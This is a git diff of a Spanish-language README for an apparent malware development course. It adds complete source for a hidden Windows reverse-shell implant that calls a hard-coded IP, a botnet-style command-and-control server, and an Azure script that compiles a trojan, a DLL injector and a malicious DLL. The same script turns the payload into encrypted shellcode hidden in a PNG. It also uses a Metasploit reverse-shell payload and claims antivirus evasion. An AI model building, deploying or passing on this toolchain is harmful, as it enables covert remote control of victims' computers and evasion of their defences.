@@ -26,7 +26,6 @@ yes|apt install metasploit-framework
 - Creacion de entorno de trabajo
 ```bash
 mkdir -p PoC-maldev && cd $_ # Crea e ingresa al directorio PoC-maldev
-python -m pip env venv  # Crea un entorno virtual para python
 ```
 
 Para conseguir este objetivo, el malware está dividido en tres stages o etapas :
@@ -40,7 +39,7 @@ Para conseguir este objetivo, el malware está dividido en tres stages o etapas 
 curl https://www.iconfinder.com/icons/7150904/download/ico/4096 -o venv/pornhub.png
 ```
 
-- Payload|Shellcode:
+- Shellcode Payload:
 ```bash
 echo """use payload/windows/x64/shell_reverse_tcp
 set LHOST 0.0.0.0
@@ -55,11 +54,6 @@ msfconsole -q -r venv/msfshellcode.rc
 - Activa el entorno virtual de Python
 ```bash
 source venv/bin/activate
-```
-
-- Instalacion de modulos de Python requeridos
-```bash
-python3 -m pip --no-cache-dir install wave donut-shellcode
 ```
 
 - Script PoC-maldev/venv/xor.py
@@ -457,12 +451,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 }
 ```
 
-- Script PoC-maldev/compile.sh
+- Script PoC-maldev/compile.sh : Script de compiladoción para Linux (Bash)
 ```bash
 #!/bin/bash
 
 x86_64-w64-mingw32-windres -o resources.o resources.rc
 x86_64-w64-mingw32-g++ -o trojan trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,windows resources.o
+```
+
+- Script PoC-maldev/compile.bat : Script de compilación para para Windows
+```bat
+@ECHO OFF
+
+rc /nologo resources.rc
+cvtres /nologo /MACHINE:x64 /OUT:resources.o resources.res
+cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp trojan.cpp /link /OUT:trojan.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 resources.o
 ```
 
 - Compilacion
@@ -477,6 +480,12 @@ x86_64-w64-mingw32-g++ -o trojan trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,w
 bash compile.sh
 ```
 
+O alternativamente en Windows:
+
+```bat
+compile.bat
+```
+
 Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [Chat de Telegram](https://t.me/Ivam3by_Cinderella)
 
 
@@ -484,7 +493,7 @@ Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [C
 
     Apoyate con el video de la ponencia en su [Segunda Parte](https://t.me/Ivam3_Bot) al adquirir tu [Membresia de la comunidad](https://www.youtube.com/ivam3bycinderella/join)
 
-- Script PoC-maldev/server.py
+- Script PoC-maldev/server1.py
 ```python3
 import socket
 import sys
@@ -676,6 +685,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 }
 ```
 
+3. DLL Malicioso (evildll.dll): Esta etapa del malware es un DLL que se va a encargar de ejecutar un shellcode payload malicioso en la memoria del proceso inyectado, justo cuando es cargado en la memoria de ejecución, que nos va a dar una reverse shell, conectándose directamente al servidor C2 en la nube. Para conseguir esto realiza el proceso estándar de un shellcode loader.
+
 - Script PoC-maldev/evildll.cpp
 ```cpp
 #include <windows.h>
@@ -768,31 +779,411 @@ BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD reasonForCall, LPVOID lpReserved 
 
 Listo!! Hora de compilar nuestro dll. En la ponencia el proceso fue realizado desde un SO Windows en donde se requiere los Native Tools instalados (x64 native tools command prompt for VS 2022) junto con los siguientes scripts :
 
-- Script PoC-maldev/compiledll.bat : es el ejecutable compilador para Windows 
+- Script PoC-maldev/compile.sh : Script de compiladoción para Linux (Bash)
+```bash
+#!/bin/bash
+
+x86_64-w64-mingw32-g++ -shared -o evildll.dll evildll.def evildll.cpp
+x86_64-w64-mingw32-g++ -o dllinjector dllinjector.cpp -lurlmon -lwininet -Wl,--subsystem,windows
+```
+
+- Script PoC-maldev/compile.bat : Script de compiladoción para Windows 
 ```bat
 @ECHO OFF
 
 cl.exe /O2 /D_USRDLL /D_WINDLL evildll.cpp evildll.def /MT /link /DLL /OUT:evildll.dll
+cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp dllinjector.cpp /link /OUT:dllinjector.exe /SUBSYSTEM:WINDOWS /MACHINE:x64
 ```
 
-- Script PoC-maldev/compiledllinjector.bat
-```bat
-@ECHO OFF
-
-cl.exe /O2 /D_USRDLL /D_WINDLL evildll.cpp evildll.def /MT /link /DLL /OUT:evildll.dll
-```
     Esto creara los archivos dllinjector.exe & evil.dll
 
-- Proceso de Compilacion con [donut](https://github.com/TheWover/donut)
+- Generación de shellcode payload a partir del dllinjector.exe con [Donut](https://github.com/TheWover/donut) y [Wine](https://www.winehq.org/)
 ```bash
-donut -e 1 -x 1 -t evil.dll -o dllinjector.bin
+wine donut.exe -e 1 -b 1 -o dllinjector.bin -t dllinjector.exe
 ```
 
 Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [Chat de Telegram](https://t.me/Ivam3by_Cinderella)
 
-
-3. DLL Malicioso (evildll.dll): Esta etapa del malware es un DLL que se va a encargar de ejecutar un shellcode payload malicioso en la memoria del proceso inyectado, justo cuando es cargado en la memoria de ejecución, que nos va a dar una reverse shell, conectándose directamente al servidor C2 en la nube. Para conseguir esto realiza el proceso estándar de un shellcode loader.
-
     Asiste a la [Tercera Parte](https://t.me/Ivam3byCinderella?livestream) de la ponencia en el [canal de Telegram](https://t.me/Ivam3byCinderella) de la comunidad.
+
+4. Servidor de Comando y Control (server2.py) e implante final (implant.exe): Las 3 etapas principales del malware PoC que se cubrieron en las primeras 2 clases del curso van a permitir injectar nuestro implante final (implant.exe) que nos va a permitir ejecutar comandos y tomar control desde nuestro servidor de Comando y Control (server2.py) alojado en la nube de [Azure](https://portal.azure.com) en una instancia de máquina virtual Ubuntu 20.04 LTS. Para ello en esta última 3ra clase se cubre la programación del implante y consecutiva generación de su shellcode correspondiente, la programación del servidor y la creación de nuestro servidor en la nube. 
+
+- Script PoC-maldev/implant.cpp
+```cpp
+//C++ Headers
+#include <winsock2.h> //Socket Header
+#include <windows.h> //Win API Header
+#include <ws2tcpip.h> //TCP-IP Header
+
+//C Header
+#include <stdio.h> //Input Output Header
+
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "Shell32.lib")
+#pragma comment(lib, "Ws2_32.lib")
+
+#define DEFAULT_BUFLEN 1024
+
+void RevShell(void);
+
+void exec(char *, char *);
+
+void whoami(char *);
+
+void hostname(char *);
+
+void pwd(char *);
+
+int main() {
+
+	HWND stealth; //Declare a window handle
+	AllocConsole(); //Allocate a new console
+	stealth = FindWindowA("ConsoleWindowClass", NULL); //Find the previous Window handler and hide/show the window depending upon the next command
+	ShowWindow(stealth, SW_HIDE); //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
+	RevShell();
+
+	return 0;
+}
+
+void RevShell() {
+
+	WSADATA wsaver;
+	WSAStartup(MAKEWORD(2, 2), &wsaver);
+	SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	sockaddr_in addr;
+	addr.sin_family = AF_INET;
+	addr.sin_addr.s_addr = inet_addr("172.174.142.1");
+	addr.sin_port = htons(443);
+
+	if (connect(tcpsock, (SOCKADDR *) &addr, sizeof(addr)) == SOCKET_ERROR) {
+		closesocket(tcpsock);
+		WSACleanup();
+		exit(0);
+	}
+	else {
+		char CommandReceived[DEFAULT_BUFLEN] = "";
+		while (true) {
+			int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
+			if ((strcmp(CommandReceived, "whoami") == 0)) {
+				char buffer[257] = "";
+				whoami(buffer);
+				strcat(buffer, "\n");
+				send(tcpsock, buffer, strlen(buffer) + 1, 0);
+				memset(buffer, 0, sizeof(buffer));
+			}
+			else if ((strcmp(CommandReceived, "hostname") == 0)) {
+				char buffer[257] = "";
+				hostname(buffer);
+				strcat(buffer, "\n");
+				send(tcpsock, buffer, strlen(buffer) + 1, 0);
+				memset(buffer, 0, sizeof(buffer));
+			}
+			else if ((strcmp(CommandReceived, "pwd") == 0)) {
+				char buffer[257] = "";
+				pwd(buffer);
+				strcat(buffer, "\n");
+				send(tcpsock, buffer, strlen(buffer) + 1, 0);
+				memset(buffer, 0, sizeof(buffer));
+			}
+			else if ((strcmp(CommandReceived, "exit") == 0)) {
+				closesocket(tcpsock);
+				WSACleanup();
+				exit(0);
+			}
+			else {
+				char splitval[DEFAULT_BUFLEN] = "";
+				for (int i = 0; i < (*(&CommandReceived + 1) - CommandReceived); i++) {
+					if (CommandReceived[i] == *" ") {
+						break;
+					}
+					else {
+						splitval[i] = CommandReceived[i];
+					}
+				}
+				if ((strcmp(splitval, "exec") == 0)) {
+					char CommandExec[DEFAULT_BUFLEN] = "";
+					int j = 0;
+					for (int i = 5; i < (*(&CommandReceived + 1) - CommandReceived); i++) {
+						CommandExec[j] = CommandReceived[i];
+						++j;
+					}
+					char buffer[257] = "";
+					exec(buffer, CommandExec);
+					strcat(buffer, "\n");
+					send(tcpsock, buffer, strlen(buffer) + 1, 0);
+					memset(buffer, 0, sizeof(buffer));
+				}
+				else {
+					char buffer[20] = "Invalid command\n";
+					send(tcpsock, buffer, strlen(buffer) + 1, 0);
+					memset(buffer, 0, sizeof(buffer));
+				}
+			}
+			memset(CommandReceived, 0, sizeof(CommandReceived));
+		}
+	}
+}
+
+void exec(char * returnval, char * fileexec) {
+	if (32 >= (INT_PTR) ShellExecute(NULL, "open", fileexec, NULL, NULL, SW_SHOWNORMAL)) {
+		strcat(returnval, "[x] Error executing command...\n");
+	}
+	else {
+		strcat(returnval, "\n");
+	}
+}
+
+void whoami(char * returnval) {
+	DWORD bufferlen = 257;
+	GetUserName(returnval, &bufferlen);
+}
+
+void hostname(char * returnval) {
+	DWORD bufferlen = 257;
+	GetComputerName(returnval, &bufferlen);
+}
+
+void pwd(char * returnval) {
+	TCHAR tempvar[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, tempvar);
+	strcat(returnval, tempvar);
+}
+```
+
+- Script PoC-maldev/server2.py
+```python
+#!/usr/bin/python3
+
+import socket
+import sys
+import os
+import threading
+import queue
+import time
+
+q = queue.Queue()
+Socketthread = []
+ClientList = {}
+
+class BotHandler(threading.Thread):
+	def __init__(self, client, client_address, qv):
+		threading.Thread.__init__(self)
+		self.client = client
+		self.client_address = client_address
+		self.ip = client_address[0]
+		self.port = client_address[1]
+		self.q = qv
+
+	def run(self):
+		BotName = threading.current_thread().name
+		print(f"\n[*] Slave {self.ip}:{self.port} connected with Thread-ID: {BotName}")
+		ClientList[BotName] = self.client_address
+		while True:
+			RecvBotCmd = self.q.get()
+			try:
+				self.client.send(RecvBotCmd.encode('latin-1'))
+				recvVal = (self.client.recv(1024)).decode('latin-1')
+				print(recvVal)
+			except Exception as e:
+				print(e)
+				break
+
+class BotCmd(threading.Thread):
+	def __init__(self, qv2):
+		threading.Thread.__init__(self)
+		self.q = qv2
+
+	def run(self):
+		while True:
+			SendCmd = str(input("BotCmd> "))
+			if SendCmd == "":
+				pass
+			elif SendCmd == "exit":
+				for i in range(len(Socketthread)):
+					time.sleep(0.1)
+					self.q.put(SendCmd)
+				time.sleep(5)
+				os._exit(0)
+			else:
+				print(f"[+] Sending command: {SendCmd} to {str(len(Socketthread))} bots")
+				for i in range(len(Socketthread)):
+					time.sleep(0.1)
+					self.q.put(SendCmd)
+
+def listener(lhost, lport, q):
+	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	server_address = (lhost, lport)
+	server.bind(server_address)
+	server.listen(100)
+
+	print(f"[+] Startring Botnet listener on tcp: {lhost}:{lport}\n")
+	BotCmdThread = BotCmd(q)
+	BotCmdThread.start()
+	while True:
+		(client, client_address) = server.accept()
+		newthread = BotHandler(client, client_address, q)
+		Socketthread.append(newthread)
+		newthread.start()
+
+def main():
+
+	if (len(sys.argv) < 3):
+		print(f"""
+[!] Usage:
+[+] python3 {sys.argv[0]} <LHOST> <LPORT>
+[+] Eg.: python3 {sys.argv[0]} 127.0.0.1 8080
+""")
+	else:
+		try:
+			lhost = sys.argv[1]
+			lport = int(sys.argv[2])
+			listener(lhost, lport, q)
+		except Exception as e:
+			print(f"\n[-] Unable to run the handler. Reason: {e}\n")
+
+if __name__ == "__main__":
+	main()
+```
+
+- Script PoC-maldev/build.sh
+```bash
+#!/bin/bash
+
+echo "[+] Creating CrashCourseMaldev resource group..."
+az group create --name CrashCourseMaldev --location eastus > /dev/null 2>&1
+echo "[+] CrashCourseMaldev resource group successfully created"
+
+echo "[+] Creating C2 instance..."
+user="user"
+c2ip=$(az vm create \
+    --resource-group CrashCourseMaldev \
+    --name c2 \
+    --image Canonical:0001-com-ubuntu-server-focal:20_04-lts-gen2:latest \
+    --size Standard_B2s \
+    --zone 1 \
+    --admin-username $user \
+    --generate-ssh-keys \
+    --nsg c2-nsg \
+    --public-ip-address c2-ip \
+    --public-ip-address-allocation static \
+    --public-ip-sku Standard \
+    --storage-sku Standard_LRS \
+    | grep publicIpAddres | awk -F': ' '{print $2}' | sed 's/["]//g' | sed 's/,//g')
+echo "[+] C2 instance successfully created"
+echo "[+] C2 IP address: $c2ip"
+
+echo "[+] Adding network security group rules..."
+bmip=$(curl -s whatismyip.akamai.com | sed 's/\n//g')
+az network nsg rule create \
+    --resource-group CrashCourseMaldev \
+    --nsg-name c2-nsg \
+    --name AllowC2Connection1 \
+    --access Allow \
+    --protocol Tcp \
+    --direction Inbound \
+    --priority 320 \
+    --source-address-prefix $bmip \
+    --source-port-range "*" \
+    --destination-port-ranges 4444 > /dev/null 2>&1
+echo "[+] Inbound rule for port 4444 added to c2-nsg"
+
+az network nsg rule create \
+    --resource-group CrashCourseMaldev \
+    --nsg-name c2-nsg \
+    --name AllowC2Connection2 \
+    --access Allow \
+    --protocol Tcp \
+    --direction Inbound \
+    --priority 330 \
+    --source-address-prefix $bmip \
+    --source-port-range "*" \
+    --destination-port-ranges 80 > /dev/null 2>&1
+echo "[+] Inbound rule for port 80 added to c2-nsg"
+
+az network nsg rule create \
+    --resource-group CrashCourseMaldev \
+    --nsg-name c2-nsg \
+    --name AllowC2Connection3 \
+    --access Allow \
+    --protocol Tcp \
+    --direction Inbound \
+    --priority 340 \
+    --source-address-prefix $bmip \
+    --source-port-range "*" \
+    --destination-port-ranges 443 > /dev/null 2>&1
+echo "[+] Inbound rule for port 443 added to c2-nsg"
+
+echo "[+] Compiling implant.exe..."
+sed -i "s/inet_addr(\"[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\")/inet_addr(\"$c2ip\")/" implant.cpp
+x86_64-w64-mingw32-g++ -o implant implant.cpp -lwsock32 -lws2_32
+
+echo "[+] Generating implant.c shellcode..."
+export WINEDEBUG=fixme-all
+wine donut.exe -b 1 -o implant.c -f 3 -t implant.exe > /dev/null 2>&1
+sed -i 's/buf/shellcodePayload/' implant.c
+sed -i 's/^.*unsigned char shellcodePayload\[\] =.*$//g' evildll.cpp
+sed -i '/\x[a-f0-9]\{2\}/d' evildll.cpp
+sed -i '6 r implant.c' evildll.cpp
+
+echo "[+] Compiling dllinjector.exe and evildll.dll..."
+sed -i "s/\\(http:\\/\\/\)[0-9]\\{1,3\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\(:80\\/.*\\)/\\1$c2ip\\2/" dllinjector.cpp
+x86_64-w64-mingw32-g++ -shared -o evildll.dll evildll.def evildll.cpp
+x86_64-w64-mingw32-g++ -o dllinjector dllinjector.cpp -Wno-all -lurlmon -lwininet -Wl,--subsystem,windows
+
+echo "[+] Generating dllinjector.bin shellcode..."
+wine donut.exe -e 1 -b 1 -o dllinjector.bin -t dllinjector.exe > /dev/null 2>&1
+
+echo "[+] Encrypting dllinjector.bin shellcode..."
+python3 xor.py dllinjector.bin
+mv encrypted.bin dllinjectorencrypted.bin
+
+echo "[+] Injecting dllinjectorecnryped.bin into pornhub.png..."
+python3 lsb.py -hide pornhub.png dllinjectorencrypted.bin pornhublsb.png > /dev/null 2>&1
+
+echo "[+] Compiling trojan.exe..."
+sed -i "s/inet_addr(\"[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\")/inet_addr(\"$c2ip\")/" trojan.cpp
+x86_64-w64-mingw32-windres -o resources.o resources.rc
+x86_64-w64-mingw32-g++ -o trojan trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,windows resources.o
+
+echo "[+] Ziping resources into Test.zip ..."
+zip -r Test.zip trojan.exe evildll.dll server1.py server2.py
+
+echo "[+] Sending setup.sh and Test.zip to C2..."
+scp -P 22 setup.sh $user@$c2ip:/home/$user/setup.sh
+scp -P 22 Test.zip $user@$c2ip:/home/$user/Test.zip
+
+echo "[+] Seting up C2 server..."
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" $user@$c2ip "chmod +x /home/$user/setup.sh && bash /home/$user/setup.sh"
+
+echo "[+] Done!"
+```
+
+- Script PoC-maldev/setup.sh
+```bash
+#!/bin/bash
+
+sudo apt-get update && sudo apt-get full-upgrade -y && sudo apt-get install python3-pip zip unzip -y
+echo "export PATH=/home/user/.local/bin:$PATH" >> /home/user/.bashrc
+python3 -m pip install --upgrade pip
+python3 -m pip install Pillow numpy
+unzip Test.zip && rm Test.zip
+```
+
+- Script PoC-maldev/rmrsrc.sh
+```bash
+#!/bin/bash
+
+echo "Deleting CrashCourseMaldev resource group..."
+az group delete --name CrashCourseMaldev --yes --verbose
+echo "Deleting NetworkWatcherRG resource group..."
+az group delete --name NetworkWatcherRG --yes --verbose
+echo "Deleting DefaultResourceGroup-EUS resource group..."
+az group delete --name DefaultResourceGroup-EUS --yes --verbose
+echo "Deleting all generated files"
+rm {pornhublsb.png,resources.o,trojan.exe,dllinjector.exe,evildll.dll,client.exe,implant.c,dllinjector.bin,dllinjectorencrypted.bin,Test.zip}
+rm $HOME/.ssh/{id_rsa,id_rsa.pub}
+```
 
     Escaneo de malware en [AntiScanMe](https://antiscan.me), [Windows Defender](https://www.microsoft.com/es-mx/windows/comprehensive-security), [VirusTotal](https://www.virustotal.com) y [Kaspersky](https://latam.kaspersky.com/) sin ser detectado a Diciembre 2022.
